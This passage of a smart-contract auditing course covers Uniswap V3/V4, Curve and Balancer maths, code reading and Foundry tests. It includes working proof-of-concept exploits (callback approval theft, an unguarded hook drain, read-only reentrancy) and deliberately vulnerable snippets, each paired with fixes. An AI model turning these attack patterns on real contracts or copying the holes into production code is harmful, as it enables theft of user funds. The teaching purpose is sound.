Tick spacing. Fee tier decides which ticks can be initialized: 0.05% uses spacing 10, 0.3% uses 60, 1% uses 200. A bitmap (one bit per spacing-aligned tick, 256 per word) lets a swap find the next initialized tick quickly.

Oracle. The pool stores tickCumulative. Time-weighted tick = Δ(tickCumulative) / Δt, and the price is 1.0001 to that power. This is a geometric mean, and the round-down for negative values must go toward −∞.

Step 2. Play with it

Step 3. Read the code

Do this 
git clone https://github.com/Uniswap/v3-core && git clone https://github.com/Uniswap/v3-periphery
ls v3-core/contracts v3-core/contracts/libraries
Read in this order. Names from memory; confirm.
ReadLook for
libraries/TickMath.solgetSqrtRatioAtTick bit tricks, MIN/MAX_TICK, MIN/MAX_SQRT_RATIO. Just know what it promises; do not derive the constants.
libraries/FullMath.solmulDiv with a 512-bit intermediate. Every price × liquidity product goes through it.
libraries/SqrtPriceMath.solNext price after adding input, amounts for a price move, round-up/round-down flags.
libraries/SwapMath.sol computeSwapStepOne step to the next tick or to the target price, fee taken from input.
UniswapV3Pool.swapThe loop: find next tick, compute step, cross tick (apply liquidityNet), repeat. The unlocked lock and callback.
libraries/Tick.sol, TickBitmap.sol, Position.solupdate, cross, getFeeGrowthInside, flipping bits, position fee update.
libraries/Oracle.solRing buffer, cardinality growth, observe and OLD revert.
Periphery: SwapRouter, CallbackValidation, PoolAddressHow integrators prove the caller of a callback is a real pool.

Core pattern, like V2: the pool sends tokens first, then calls uniswapV3SwapCallback on the caller, then checks it was paid by comparing balances. Every callback is an external entry point that anyone can call directly.

Step 4. Fork experiments

export ETH_RPC_URL=https://...
forge test --match-contract V3Lab --fork-url $ETH_RPC_URL -vvv
// test/V3Lab.t.sol  (USDC/WETH 0.05% pool: verify the address on Etherscan or Uniswap docs)
import "forge-std/Test.sol";
interface IPool {
    function slot0() external view returns (uint160 sqrtPriceX96, int24 tick, uint16, uint16, uint16, uint8, bool);
    function liquidity() external view returns (uint128);
    function swap(address to, bool zeroForOne, int256 amt, uint160 limit, bytes calldata d) external returns (int256, int256);
}
interface IERC20 { function transfer(address,uint) external returns (bool); function transferFrom(address,address,uint) external returns (bool);
                   function approve(address,uint) external returns (bool); function balanceOf(address) external view returns (uint); }

contract V3Lab is Test {
    IPool pool = IPool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;   // token0
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;   // token1
    uint160 constant MIN_LIMIT = 4295128740;                      // MIN_SQRT_RATIO + 1

    function ethUsd() internal view returns (uint) {
        (uint160 s,,,,,,) = pool.slot0();
        return 1e12 * (uint(1) << 192) / (uint(s) * uint(s));      // USD per ETH from sqrtPriceX96
    }
    // pool pays us first, then calls this; we pay what we owe
    function uniswapV3SwapCallback(int256 a0, int256 a1, bytes calldata) external {
        require(msg.sender == address(pool), "not pool");
        if (a0 > 0) IERC20(USDC).transfer(msg.sender, uint(a0));
    }
    function test_priceAndImpact() public {
        emit log_named_uint("ETH price before (USD)", ethUsd());
        (, int24 t0,,,,,) = pool.slot0();
        deal(USDC, address(this), 50_000_000e6);
        pool.swap(address(this), true, int256(50_000_000e6), MIN_LIMIT, "");   // sell 50M USDC for WETH
        (, int24 t1,,,,,) = pool.slot0();
        emit log_named_uint("ETH price after (USD)", ethUsd());
        emit log_named_int("ticks moved", int(t1) - int(t0));
    }
}

Not run by me. Selling USDC for WETH raises the ETH price; if it reverts, read the error (liquidity, limit price, callback payment). Try 1,000,000 USDC versus 50,000,000 and compare how many ticks (and initialized ticks) were crossed.

Exploit: an unverified callback

Integrators often hold user approvals and pay pools from users' wallets inside the callback. If they do not verify that the caller is a real pool, anyone can call the callback directly.

contract VulnSwapper {              // users approve this contract, which pays pools on their behalf
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    function uniswapV3SwapCallback(int256 a0, int256, bytes calldata data) external {
        address payer = abi.decode(data, (address));
        if (a0 > 0) IERC20(USDC).transferFrom(payer, msg.sender, uint(a0));   // msg.sender never verified
    }
}
contract CallbackExploit is Test {
    function test_steal() public {
        address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        VulnSwapper v = new VulnSwapper(); address victim = address(0xB1C);
        deal(USDC, victim, 100_000e6);
        vm.prank(victim); IERC20(USDC).approve(address(v), type(uint).max);
        v.uniswapV3SwapCallback(int256(100_000e6), 0, abi.encode(victim));    // attacker = this test
        assertEq(IERC20(USDC).balanceOf(address(this)), 100_000e6);
    }
}
// fix: derive the pool address from (factory, token0, token1, fee) and require msg.sender equals it
CallbackValidation.verifyCallback(factory, poolKey);   // periphery helper

Step 5. Find the bug

// A. Tick.getFeeGrowthInside, compiled with Solidity 0.8, no unchecked block
feeGrowthInside0X128 = feeGrowthGlobal0X128 - feeGrowthBelow0X128 - feeGrowthAbove0X128;

// B. adding liquidity
amount0 = SqrtPriceMath.getAmount0Delta(sqrtA, sqrtB, liquidity, /*roundUp*/ false);

// C. oracle read
int24 avgTick = int24((tickCumulatives[1] - tickCumulatives[0]) / int56(window));

// D. lending protocol collateral price
(uint160 s,,,,,,) = pool.slot0();  price = uint(s) * uint(s) * 1e12 / (1 << 192);
Answers
  1. A. The accumulators are meant to wrap. In 0.8 the checked subtraction reverts when a counter has wrapped, so affected positions can no longer collect fees, burn or close (DoS and locked funds). Wrap the arithmetic in unchecked.
  2. B. When an LP adds liquidity the required token amounts must round up (user pays more), and when removing must round down. Rounding down on add lets someone mint with slightly less and repeat to drain dust, or break pool solvency.
  3. C. For a negative delta that is not divisible by the window, the mean tick must round toward negative infinity (decrement by 1), as Uniswap's OracleLibrary.consult does. Truncation toward zero biases the price. Also check the pool's observation cardinality is large enough for the window, or observe reverts with OLD.
  4. D. slot0 is the instantaneous spot price, movable by a flash loan within one transaction. Use a TWAP over a long window on a deep pool, and consider both the cost of manipulation and the value at risk.

Step 6. Study material

  • Unverified callbacks: many integrator contracts (routers, aggregators, bots) have been drained through unchecked uniswapV3SwapCallback, uniswapV3MintCallback or flash callbacks. Search for post-mortems and group them by what the callback could reach (approvals, balances, state).
  • Inverse Finance, April 2022 (~$15M): a short-window TWAP on a thin pool was manipulated. V3's TWAP is stronger per unit of liquidity, but the lesson is the same: window length and pool depth decide manipulation cost.
  • Just-in-time liquidity: an LP adds a tight range around the price just before a large swap and removes it after, capturing most fees. Not a bug in the pool, but it changes LP economics and any protocol that assumes stable liquidity.
  • Read the Trail of Bits and ABDK V3 audit reports and list which findings concern fixed-point maths versus tick/fee accounting.

Step 7. V3 checklist

  • Fixed-point: mulDiv for every price × liquidity product, correct rounding direction on each amount, no overflow when squaring sqrtPriceX96.
  • Tick range validity: lower < upper, multiples of spacing, within MIN/MAX_TICK; behaviour at the extremes.
  • Crossing ticks: liquidityNet sign by direction, feeGrowthOutside flipped correctly, exact equality at a tick boundary.
  • Fee accounting wraps intentionally (unchecked when ported to 0.8+).
  • All callbacks validate the caller and check the amount actually paid.
  • Oracle use: spot versus TWAP, cardinality, window, rounding of negative ticks, behaviour when liquidity is tiny.
  • Position NFTs and periphery: approvals, deadlines, slippage bounds on mint/burn/collect, collect amounts capped.
Lab 10 deliverable(1) By hand compute, for a range 1,500 to 2,500 at price 2,000 with 2 ETH, L, USDC needed and the efficiency; check with the calculator. (2) Run test_steal, then write the fix and show the test now fails. (3) Write a finding in the Lab 1 format for a protocol using slot0 as its oracle.

Lab 11. Uniswap V4

In plain wordsV4 keeps every pool in one contract, nets all token movements at the end of a transaction, and lets each pool attach a hook: a contract that runs custom code at set moments. Hooks are new attack surface.

Key terms: PoolManager, hook, flash accounting. See the glossary at the end.

V4 keeps V3's concentrated-liquidity maths almost unchanged. What changes is the architecture: one PoolManager contract holds every pool, balances are settled with flash accounting, and each pool can attach a hook, a contract that runs custom code at set points (before or after swap, add or remove liquidity, donate). Auditing V4 means auditing two things: the core (small, heavily reviewed) and every hook (arbitrary code, new for each protocol).

Step 1. What changed from V3

V3V4
PoolsOne contract per pool, created by a factoryOne singleton PoolManager; a pool is just a PoolKey struct
Pool idContract addresskeccak256(abi.encode(PoolKey))
Token transfersPool pays out, callback, pool checks balancePer-currency deltas tracked in transient storage; settled once at the end
CustomisationNoneHooks, dynamic fees, custom accounting
Fee tiersFixed setAny fee and tick spacing, permissionless init
Native ETHOnly WETHNative ETH supported (currency address 0)
Extra tokensNFT positions onlyERC-6909 "claims" balances inside the manager
struct PoolKey { Currency currency0; Currency currency1; uint24 fee; int24 tickSpacing; IHooks hooks; }

Step 2. Flash accounting

Everything happens inside poolManager.unlock(data), which calls unlockCallback(data) on the caller. Inside it you may call swap, modifyLiquidity, donate, take, settle, mint, burn, sync, clear. Each call changes a delta for (account, currency): negative means you owe the manager, positive means the manager owes you. When the callback returns, the manager reverts unless every delta is zero.

Worked multi-hop. Swap 1,000 USDC to DAI through two pools (USDC/WETH then WETH/DAI):

StepUSDC deltaWETH deltaDAI delta
swap pool A−1,000+0.50
swap pool B−1,0000+1,000
settle USDC00+1,000
take DAI000 ✔

The intermediate WETH never leaves the manager: two token transfers instead of four. Settling an ERC-20: call sync(currency) (records the manager's balance), transfer tokens in, call settle() (credits the balance increase). Order matters.

Hook permissions live in the hook's address. The lowest 14 bits of the address say which callbacks the manager will call. A hook must be deployed with CREATE2 at an address whose bits match.

Bit131211109876543210
FlagbeforeInitafterInitbeforeAddLiqafterAddLiqbeforeRemoveLiqafterRemoveLiqbeforeSwapafterSwapbeforeDonateafterDonatebeforeSwap ΔafterSwap ΔafterAddLiq ΔafterRemoveLiq Δ

Example: beforeSwap (bit 7 = 0x80) plus afterSwap (bit 6 = 0x40) means the address must end so that addr & 0x3FFF == 0x00C0. Hand check with the decoder:

Fees in pips. 3000 = 0.3%; 1,000,000 = 100%. A dynamic-fee pool lets the hook choose the LP fee. Swapping 1,000 USDC at 0.3% costs 3 in LP fee; if the hook overrides to 1%, it costs 10. A hook with afterSwapReturnDelta can also take part of the output: it takes 0.1% of a 0.5 ETH output = 0.0005 ETH.

Step 3. Read the code

Do this 
git clone https://github.com/Uniswap/v4-core && git clone https://github.com/Uniswap/v4-periphery
git clone https://github.com/uniswapfoundation/v4-template      # a working hook project with tests
Names from memory; confirm.
ReadLook for
v4-core/src/PoolManager.solunlock, the onlyWhenUnlocked modifier, take, settle, sync, donate, protocol fee handling.
src/libraries/Pool.solV3's swap and liquidity logic moved into a library. Compare with Lab 10.
src/libraries/Hooks.solPermission bit decoding, callHook, how hook return deltas and fee overrides are validated.
src/libraries/CurrencyDelta.sol, NonzeroDeltaCount.sol, Lock.solTransient storage usage: where deltas are written and how "all zero" is verified.
v4-periphery/src/PositionManager.sol, V4RouterAction-encoded batching; who settles and takes, and who pays.
v4-periphery/src/base/hooks/BaseHook.solonlyPoolManager on each callback, the permissions declaration, address validation.

Step 4. Hands-on

Do this 
cd v4-template && forge install && forge test -vvv
Open the sample hook and its test. The test deploys a hook to a mined address using deployCodeTo with the right flag bits, initializes a pool, adds liquidity and swaps. Change the hook's permissions in getHookPermissions() without changing the deployment address and read the error.

Exploit: a hook with no caller check

Hook callbacks are plain external functions. If they are not restricted to the PoolManager, anyone can call them directly. This standalone test uses a simplified signature; in real V4 the arguments are (sender, key, params, delta, hookData).

contract MockToken {
    mapping(address => uint) public balanceOf;
    function mint(address to, uint a) external { balanceOf[to] += a; }
    function transfer(address to, uint a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
}
contract RewardHook {                     // pays 100 reward tokens to each swapper
    MockToken public reward; constructor(MockToken r) { reward = r; }
    function afterSwap(address sender) external { reward.transfer(sender, 100e18); }   // no onlyPoolManager
}
contract HookExploit is Test {
    function test_drain() public {
        MockToken t = new MockToken(); RewardHook h = new RewardHook(t);
        t.mint(address(h), 1_000e18);
        for (uint i; i < 10; i++) h.afterSwap(address(this));      // no swap happens at all
        assertEq(t.balanceOf(address(this)), 1_000e18);
    }
}
modifier onlyPoolManager() { require(msg.sender == address(poolManager), "not manager"); _; }
function afterSwap(address sender) external onlyPoolManager { ... }

Add the modifier and re-run: the test must fail. Then ask a harder question: even with that fix, what does sender mean? It is whoever called the PoolManager, usually a router, not the end user. A reward or allowlist keyed on sender pays or checks the router.

Step 5. Find the bug

// A. hook
function beforeSwap(address sender, PoolKey calldata k, SwapParams calldata p, bytes calldata d)
    external returns (bytes4, BeforeSwapDelta, uint24) {
    require(allowed[sender]);                         // "only KYC'd users may swap"
    ...
}

// B. settling a token (router code)
token.transfer(address(poolManager), amount);
poolManager.sync(Currency.wrap(token));
poolManager.settle();

// C. dynamic fee hook
function beforeSwap(..., bytes calldata hookData) ... {
    uint24 fee = abi.decode(hookData, (uint24));       // caller-supplied
    return (sel, ZERO_DELTA, fee | OVERRIDE_FEE_FLAG);
}

// D. a protocol that integrates V4 pools
PoolKey memory key = PoolKey(c0, c1, fee, spacing, IHooks(userSuppliedHook));
poolManager.swap(key, params, "");                    // any hook accepted

// E. a hook using transient storage as a lock
assembly { tstore(LOCK, 1) }  ...  // never reset on one of the return paths
Answers
  1. A. sender is the router (or whatever called the manager), not the user. Either every user bypasses the check by going through an allowed router, or the check blocks everyone behind a router. Identify the end user through a trusted router interface (msgSender()) or signed hookData.
  2. B. sync must come before the transfer. settle credits the balance increase since the last sync. Here sync records the already-increased balance, so the credit is zero and the tokens are donated to the manager.
  3. C. Any swapper chooses the fee. Setting 0 drains LP revenue; setting a huge fee on someone else's behalf (through a router that forwards hookData) hurts users. Fees must come from hook state or authenticated input.
  4. D. A user-chosen hook means a malicious pool: a hook can set a 100% fee, revert on sells (honeypot) or return custom deltas. Integrators must pin the exact pool keys and hooks they trust.
  5. E. Transient storage lasts for the whole transaction, across separate external calls and bundled operations. A flag not cleared on every exit path leaves the contract locked (or unlocked) for the next call in the same transaction.

Step 6. Study material

  • Read the V4 audit reports and the public audit competition results (several firms and a large contest). Sort by layer: PoolManager, libraries, periphery, hooks.
  • Incidents on V4-based protocols in 2025: Bunni (Sept 2025, roughly $8M, a rounding flaw in how liquidity was withdrawn from a hook-managed pool after a flash-loan-assisted sequence) and Cork Protocol (May 2025, roughly $12M, involving its V4 hook). Read the post-mortems; for each, write which assumption failed and whether it was in the hook or the core. Both figures are from memory.
  • Read the EIP-1153 text and list every way transient storage can leak between calls in one transaction (multicall, account-abstraction bundles, reentrancy).

Step 7. V4 checklist

  • Core: every deltas path nets to zero; unlock cannot be nested to bypass the final check; take/settle/sync order is enforced or safely documented.
  • Hooks: all callbacks are onlyPoolManager; address flags exactly match declared permissions; return-delta flags used only if the hook settles those deltas.
  • sender semantics handled; end-user identity comes from a trusted source.
  • Hook state per pool (PoolId keyed), not global, so pools cannot interfere.
  • Dynamic fee: source authenticated, bounded (below 100%).
  • Custom accounting or custom curves: rounding favours the pool, withdrawals cannot be sandwiched by deposit/withdraw in one transaction, flash-loan scenarios tested.
  • Hook admin: upgradeability, owner powers, pausing; can the owner change behaviour for existing LPs?
  • Integrators: pool keys and hooks whitelisted, native ETH handled, ERC-6909 claims and approvals understood, slippage and deadline set.
Lab 11 deliverable(1) Pick a hook permission set (e.g. dynamic fee plus afterSwap return delta) and compute the required address low bits by hand; check with the decoder. (2) Run test_drain, add onlyPoolManager, show the test failing. (3) Write a finding in the Lab 1 format for the bug in snippet B.

Lab 12. Curve (StableSwap)

In plain wordsCurve is built for assets that should trade near 1:1. Its curve is flat near the peg, so large trades barely move the price, but there is no closed formula, so the contract finds the answer by repeated approximation.

Key terms: amplification A, invariant D, virtual price. See the glossary at the end.

Constant product is a poor fit for assets that should trade near 1:1 (USDC/USDT, stETH/ETH): even small trades move the price. Curve's invariant is flat near the peg and curves like constant product only when the pool becomes very imbalanced. The price you pay: no closed-form solution. The pool finds its invariant D and every swap output by iterating (Newton's method), so rounding, convergence and decimals all matter to an auditor. Curve is also where read-only reentrancy and a compiler bug became household names.

Step 1. The maths

n coins, balances x_i, S = Σ x_i, Ann = A · n   (as the code defines it)

Invariant       Ann·S + D = Ann·D + D^(n+1) / (n^n · Π x_i)
Balanced pool   x_i = D/n for all i, so S = D
D iteration     D ← (Ann·S + n·D_P) · D / ((Ann − 1)·D + (n + 1)·D_P)
                where D_P = D^(n+1) / (n^n · Π x_i), repeat until |ΔD| ≤ 1
Swap            new x_i known → solve for x_j by Newton on the same invariant (get_y)
                out = x_j(before) − x_j(after) − 1,   then fee is taken from out
Virtual price   D / totalSupply of LP   (grows as fees accrue; ≥ 1 in normal pools)

Intuition. Large A means the term Ann·S dominates: the curve behaves like a constant-sum line (x + y = D, price exactly 1). Small A lets the product term dominate: the curve behaves like constant product. A is therefore a "how stable do we believe these assets are" dial.

Worked comparison (2 coins, 1,000,000 each, D = 2,000,000, no fee). Output for selling dx of coin 0:

dxConstant productA = 10A = 100A = 1000
100,00090,90999,09299,90099,990
500,000333,333473,401496,753499,668
900,000473,684770,584869,629895,942

At A = 100, a 10% trade costs only 0.1% of price impact, yet a 90% trade still costs 3.4%. If one coin depegs, the pool keeps quoting near 1:1 until it is very lopsided, so arbitrageurs can drain the good coins and leave LPs with mostly the bad one. Imbalance also lowers D: a 1.9M / 0.1M pool at A = 100 has D ≈ 1,960,246, below the 2,000,000 sum.

Fees. Charged on the output, denominator 1010 (4,000,000 = 0.04%). A share goes to the admin (DAO). Single-sided deposits and withdrawals that unbalance the pool are charged an imbalance fee.

Pool types. Plain pools (3pool: DAI, USDC, USDT); metapools pair one asset with an LP token of a base pool and use that LP token's virtual_price; crypto pools (CryptoSwap, Tricrypto) add a second parameter gamma and an internal repegging oracle for volatile assets; NG versions are newer implementations. Learn the plain pool first.

Step 2. Play with it

Try x = 1,900,000 and y = 100,000 (a depegging pool): what does selling the scarce coin versus the abundant coin cost? Then lower A to 10 and repeat.

Step 3. Read the code

Do this 
git clone https://github.com/curvefi/curve-contract
ls curve-contract/contracts/pools/3pool curve-contract/contracts/pool-templates
The code is Vyper, not Solidity. Learn three differences: no inheritance or modifiers, @nonreentrant("lock") decorators, and checked arithmetic by default. Names below are from memory.
ReadLook for
get_D, get_y, get_y_DThe Newton loops: 255-iteration cap, convergence test of 1, the raise when it does not converge, order of multiply and divide to avoid precision loss.
exchangeBalance read, dy via get_y, the "−1" rounding, fee on output, admin fee split, decimals via PRECISION_MUL / rates.
add_liquidity, remove_liquidity_imbalance, remove_liquidity_one_coinFee on the imbalance, calc_token_amount versus the real mint, min amounts.
get_virtual_priceWhat it reads (self.balances or real balances), and when its inputs are stale.
ramp_A, stop_ramp_A, admin functionsMinimum ramp time, maximum change factor, who may call.
ETH pools: raw_call sendsWhen ETH is transferred relative to state updates and the reentrancy lock.

Step 4. Hands-on

export ETH_RPC_URL=https://...
forge test --match-contract CurveLab --fork-url $ETH_RPC_URL -vvv
// test/CurveLab.t.sol  (3pool address: verify on Etherscan or Curve docs)
import "forge-std/Test.sol";
interface IPool3 {
    function balances(uint256 i) external view returns (uint256);
    function A() external view returns (uint256);
    function fee() external view returns (uint256);
    function get_virtual_price() external view returns (uint256);
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
}
contract CurveLab is Test {
    IPool3 pool = IPool3(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);   // DAI, USDC, USDT
    function test_impact() public {
        uint dai = pool.balances(0); uint usdc = pool.balances(1) * 1e12;   // normalise to 18 decimals
        emit log_named_uint("A", pool.A());
        emit log_named_uint("virtual price", pool.get_virtual_price());
        uint[3] memory sizes = [uint(1e6), 50e6, 200e6];                    // trade sizes in USD
        for (uint k; k < 3; k++) {
            uint dx = sizes[k] * 1e18;
            uint out = pool.get_dy(0, 1, dx) * 1e12;                         // DAI to USDC, back to 18 decimals
            uint cp = usdc * dx / (dai + dx);                                // constant-product benchmark
            emit log_named_uint("size (USD)", sizes[k]);
            emit log_named_uint("curve out (bps of input)", out * 10000 / dx);
            emit log_named_uint("const-product out (bps)", cp * 10000 / dx);
        }
    }
}

Not run by me. Pool balances and A may have changed, so rely on the shape: Curve's output stays near 10,000 bps for far larger trades than constant product.

Exploit: read-only reentrancy

Some pools send ETH (or call a token hook) before they finish updating balances. A function that never writes state, such as get_virtual_price, can then return a wrong value in the middle of the call. Any protocol that reads it, for example to value LP tokens as collateral, can be fooled. This simplified model reproduces the pattern.

contract MockPool {
    uint public totalSupply; uint public tracked; mapping(address => uint) public lp;
    function add() external payable {
        uint s = totalSupply == 0 ? msg.value : msg.value * totalSupply / tracked;
        lp[msg.sender] += s; totalSupply += s; tracked += msg.value;
    }
    function remove(uint shares) external {
        uint amt = shares * tracked / totalSupply;
        lp[msg.sender] -= shares; totalSupply -= shares;          // burn first
        (bool ok,) = msg.sender.call{value: amt}(""); require(ok);  // callback happens here
        tracked -= amt;                                           // accounting updated last
    }
    function virtualPrice() external view returns (uint) { return tracked * 1e18 / totalSupply; }
}
contract Lender {
    MockPool pool; mapping(address => uint) public debt;
    constructor(MockPool p) payable { pool = p; }
    function borrow(uint amt) external {
        require(pool.lp(msg.sender) * pool.virtualPrice() / 1e18 >= debt[msg.sender] + amt, "undercollateralised");
        debt[msg.sender] += amt;
        (bool ok,) = msg.sender.call{value: amt}(""); require(ok);
    }
}
contract Attacker {
    MockPool p; Lender l; constructor(MockPool _p, Lender _l) { p = _p; l = _l; }
    function go() external payable { p.add{value: 100 ether}(); p.remove(50 ether); }
    receive() external payable { if (msg.sender == address(p)) l.borrow(60 ether); }   // inside the callback
}
contract ROReentrancy is Test {
    function test_attack() public {
        MockPool p = new MockPool(); p.add{value: 100 ether}();                 // honest LP
        Lender l = new Lender{value: 100 ether}(p);
        Attacker a = new Attacker(p, l); vm.deal(address(a), 100 ether);
        a.go();
        uint fair = p.lp(address(a)) * p.virtualPrice() / 1e18;                 // after the call: price back to 1
        emit log_named_uint("collateral worth", fair); emit log_named_uint("debt", l.debt(address(a)));
        assertLt(fair, l.debt(address(a)));                                    // 50 < 60: bad debt
    }
}

Trace it by hand: honest 100 plus attacker 100 gives supply 200, tracked 200. The attacker removes 50: supply is 150, tracked still 200, so virtualPrice = 1.333 in the callback and 50 shares look worth 66.7. They borrow 60. After the call tracked is 150 and the price is 1.0, so the collateral is worth 50 against a debt of 60. Real attacks use flash loans to make this gap enormous.

// pool: set a flag during remove and make the view revert while it is set
bool locked;
function remove(uint s) external { locked = true; ...; locked = false; }
function virtualPrice() external view returns (uint) { require(!locked, "pool busy"); ... }
// on Curve pools integrators call a nonreentrant function (e.g. remove_liquidity with 0 amounts) first,
// so the pool's own lock reverts if they are mid-call

Apply the fix and re-run: the borrow inside the callback now reverts, and so the whole attack fails.

Step 5. Find the bug

// A. a vault values its holdings
uint value = pool.get_dy(0, 1, 1e18) * amount / 1e18;           // spot quote from the Curve pool

// B. LP token as collateral
uint collateralValue = lpAmount * pool.get_virtual_price() / 1e18;   // treated as $1 per virtual-price unit

// C. min output for a DAI(18) to USDC(6) swap
pool.exchange(0, 1, daiAmount, daiAmount * 99 / 100);

// D. deployment
# @version 0.3.0
@external
@nonreentrant("lock")
def remove_liquidity(...):
Answers
  1. A. A spot quote changes with the pool's balances, which a flash loan can move inside one transaction (Harvest Finance, Oct 2020, about $24M). Use an oracle (Chainlink, a time-averaged price), not a same-block swap quote.
  2. B. virtual_price measures LP value in units of the pool's coins; it is only worth "$1 each" if every coin is. If one coin depegs the LP is overvalued. Combine virtual_price with the minimum of the coin prices from oracles. Also guard against read-only reentrancy before reading it.
  3. C. Decimals. The output is in 6 decimals, so daiAmount · 0.99 (18 decimals) is 1012 times too large and the swap always reverts. In the opposite direction the same mistake leaves no slippage protection at all. Convert to the output token's decimals first.
  4. D. Vyper 0.2.15, 0.2.16 and 0.3.0 had a compiler bug in the reentrancy-lock storage allocation, so @nonreentrant silently did nothing. In July 2023 several Curve pools compiled with these versions (alETH, msETH, pETH and the CRV/ETH pool) were drained of about $70M in total, some of it later returned. Always check the compiler version and its known issues, and test that the lock actually blocks reentry.

Step 6. Study material

  • Vyper compiler bug, July 2023: read the Vyper post-mortem and the incident analyses. Write down why code review alone could not catch this and what tests would have.
  • Read-only reentrancy victims: protocols that valued Curve LP tokens during callbacks (for example Conic Finance, July 2023, roughly $3M) and the earlier ChainSecurity write-up that named the bug class. For each case find what was read and when.
  • Harvest Finance, Oct 2020: rebuild the flash-loan sequence on paper.
  • Read the Curve StableSwap whitepaper section on the invariant and the Curve V2 (CryptoSwap) paper's repegging section; list what a malicious A or gamma ramp could do.

Step 7. Curve checklist

  • Newton loops: iteration cap, revert on non-convergence, no division by zero for zero balances, rounding favouring the pool, -1 adjustments preserved.
  • Decimals and rates for every coin; rebasing or fee-on-transfer coins unsupported or handled.
  • Reentrancy: lock present and effective at the compiled version; ETH/hook transfers after state updates; view functions safe to read mid-call.
  • Fees: imbalance fee, admin fee split, rounding of the fee itself.
  • Admin: A ramp limits, fee limits, kill switch, ownership transfer delay.
  • Metapools: base pool virtual price freshness and manipulation.
  • Integrators: LP valuation method, oracle for each coin, pool reentrancy guard call before reads, slippage in the right decimals.
Lab 12 deliverable(1) With the calculator, find the A at which a 500,000 sale into a 1M/1M pool costs under 0.5% price impact. (2) Run test_attack, add the lock, and show the attack now fails. (3) Write a finding in the Lab 1 format for snippet B (LP valued at virtual price only).

Lab 13. Balancer V2

In plain wordsBalancer separates custody from pricing: one Vault holds all funds and each pool only calculates prices. Pools can hold several tokens in custom weights such as 80/20.

Key terms: Vault, weights, pool token. See the glossary at the end.

Balancer V2 separates custody from pricing. One Vault contract holds the tokens of every pool and does all the accounting; each pool is a separate contract that only answers "given these balances, what is the output of this swap?". That makes pools easy to write and risky in two specific ways: the Vault becomes a single point holding everything, and pool maths (done in fixed-point with logs and exponentials) must round correctly or it can be milked in tiny steps.

Step 1. The maths

Weighted pool    V = Π B_i^(w_i)                 (Σ w_i = 1, each w_i ≥ 1%)
Spot price       1 unit of token i buys  (B_o / w_o) / (B_i / w_i)  units of token o
Out given in     A_o = B_o · (1 − (B_i / (B_i + A_in))^(w_i / w_o))        (A_in is after fee)
In given out     A_i = B_i · ((B_o / (B_o − A_out))^(w_o / w_i) − 1)
Limits           A_in ≤ 30% of B_i,   A_out ≤ 30% of B_o   (keeps the pow inside its accurate range)
BPT price        rate = V · 1e18 / totalSupply   (getRate())

With all weights equal (50/50) the formula reduces to constant product. Weights let an LP hold a 80/20 portfolio and rebalance through trades.

Worked swap. 80/20 pool: 100 ETH (weight 0.8) and 50,000 USDC (weight 0.2). Spot: 1 ETH = (50,000/0.2) / (100/0.8) = 250,000 / 125 = 2,000 USDC. Invariant V = 1000.8 · 50,0000.2 = 346.57.

  • Swap 10,000 USDC in (no fee): out = 100 · (1 − (50,000/60,000)0.25) = 4.4557 ETH. Average price 2,244. New spot = (60,000/0.2) / (95.544/0.8) = 2,512.
  • Check: 95.5440.8 · 60,0000.2 = 346.57. V did not change (before fees).
  • With a 0.3% fee on the input: out = 4.4438 ETH. The fee stays in the pool, so V grows slightly.

Joins and exits. A proportional join (add 10% of every token) mints 10% of the BPT with no fee. A single-token join is equivalent to a proportional join plus a swap, so the swap fee is charged on the non-proportional part.

Vault accounting. batchSwap routes through several pools and returns net asset deltas. Example: 1,000 USDC → WETH (pool 1) → BAL (pool 2) gives deltas USDC +1000 (user pays), WETH 0 (the intermediate nets out), BAL −x (user receives). User-supplied limits cap how much may be paid or must be received.

Pool types. Weighted (up to 8 tokens), Stable (StableSwap maths like Lab 12), ComposableStable (the pool's own BPT is one of its tokens, enabling nested pools and rate providers), Linear (wrap yield-bearing tokens for "boosted" pools), Managed (weights changeable by a manager).

Step 2. Play with it

Try a 50/50 pool, then 98/2, with the same trade. Then push the amount past 30% and note the revert: limits are part of the security design, not a nuisance.

Step 3. Read the code

Do this 
git clone https://github.com/balancer/balancer-v2-monorepo
ls balancer-v2-monorepo/pkg
Paths and names from memory; confirm.
ReadLook for
pkg/vault/contracts/Vault.sol and Swaps.solswap, batchSwap, how deltas are accumulated and settled, FundManagement (sender, recipient, internal balances), limits and deadline.
VaultAuthorization.solsender == msg.sender or relayer approval; role-based admin (Authorizer).
PoolBalances.soljoinPool, exitPool, how ETH is sent, where the reentrancy guard sits.
FlashLoans.solFee, balance check after callback.
pkg/pool-weighted/contracts/WeightedMath.solEach formula above and the rounding direction of every step.
pkg/solidity-utils/contracts/math/FixedPoint.sol, LogExpMath.solmulDown/mulUp/divDown/divUp, powUp/powDown (add or subtract an error bound), accuracy limits of pow.
pkg/pool-stable/contracts/StableMath.sol, ComposableStablePool.solNewton iteration (compare with Curve), scaling factors, BPT as a pool token, rate providers.

Core design: the Vault passes the pool its balances, the pool returns an amount, the Vault moves the tokens. A bug in a pool's maths (not the Vault) can still empty the shared Vault, because the pool's balances are just entries in the Vault's books.

Step 4. Hands-on

export ETH_RPC_URL=https://...
forge test --match-contract BalancerLab --fork-url $ETH_RPC_URL -vvv
// test/BalancerLab.t.sol  (Vault and pool id: verify on Balancer docs / Etherscan)
import "forge-std/Test.sol";
interface IVault {
    struct Step { bytes32 poolId; uint256 assetInIndex; uint256 assetOutIndex; uint256 amount; bytes userData; }
    struct Funds { address sender; bool fromInternalBalance; address recipient; bool toInternalBalance; }
    function getPoolTokens(bytes32 id) external view returns (address[] memory, uint256[] memory, uint256);
    function queryBatchSwap(uint8 kind, Step[] memory swaps, address[] memory assets, Funds memory f) external returns (int256[] memory);
}
interface IWeighted { function getNormalizedWeights() external view returns (uint256[] memory); function getSwapFeePercentage() external view returns (uint256); }

contract BalancerLab is Test {
    IVault vault = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    bytes32 id = 0x5c6ee304399dbdb9c8ef030ab642b10820db8f56000200000000000000000014;   // 80 BAL / 20 WETH
